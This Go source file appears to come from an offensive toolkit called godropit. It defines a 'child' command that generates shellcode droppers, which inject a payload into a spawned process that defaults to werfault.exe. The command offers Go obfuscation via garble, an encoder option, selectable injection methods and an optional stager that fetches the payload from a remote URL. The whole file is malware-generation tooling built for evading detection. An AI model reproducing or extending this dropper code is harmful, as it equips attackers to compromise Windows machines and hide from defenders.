package cmd

import (
	"log"
	"strings"
	"time"

	"github.com/kopp0ut/godropit/internal/godroplib/child"
	"github.com/kopp0ut/godropit/pkg/dropfmt"
	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

var procArgs string
var proc string

// localCmd represents the local command
var childCmd = &cobra.Command{
	Use:   "child",
	Short: "Execute in a child process",
	Long:  `Executes in a child process which has been started by the same application.`,
	Run: func(cmd *cobra.Command, args []string) {
		checkImg()
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}
		if prestamp {

			name = time.Now().UTC().Format("010206_1504") + "_" + name
		}

		gengo.Garble = garble
		var childDrop gengo.Dropper
		var Dtype gengo.DtypeChild
		var err error
		var shellcode dropfmt.DropFmt

		Dtype.Args = procArgs
		Dtype.ChildProc = proc
		childDrop.Delay = timer
		childDrop.Arch = arch
		childDrop.Shared = shared
		childDrop.Debug = debug

		childDrop.Dtype, err = gengo.GenDTypeChild(Dtype)
		if err != nil {
			log.Fatalln(err)
		}

		shellcode = gengo.NewShellcode(&childDrop, input, output, name, sgn)

		if stagerurl != "" {
			gengo.NewStager(&childDrop, shellcode, stagerurl, imgpath, hostname, ua, name, output)

		}

		if len(methods) >= 1 {
			for i := range methods {
				childDrop.Debug = true
				method := methods[i]
				childDrop.Dlls, childDrop.Inject, childDrop.Import = child.SelectChild(strings.ToLower(method))
				methodname := name + "_" + method
				gengo.NewDropper(childDrop, methodname, domain, input, output)
			}
		} else {
			childDrop.Dlls, childDrop.Inject, childDrop.Import = child.SelectChild("")

			gengo.NewDropper(childDrop, name, domain, input, output)
		}

	},
}

func init() {
	newCmd.AddCommand(childCmd)

	childCmd.MarkFlagRequired("in")
	childCmd.MarkFlagRequired("name")
	childCmd.MarkFlagRequired("out")

	//child specific flags
	childCmd.Flags().StringVarP(&proc, "proc", "p", "c:\\\\windows\\\\system32\\\\werfault.exe", "Child Process to execute in.")
	childCmd.Flags().StringVar(&procArgs, "args", "", "Arguments to pass child proc, embed in quotes or escape spaces pls.")
}
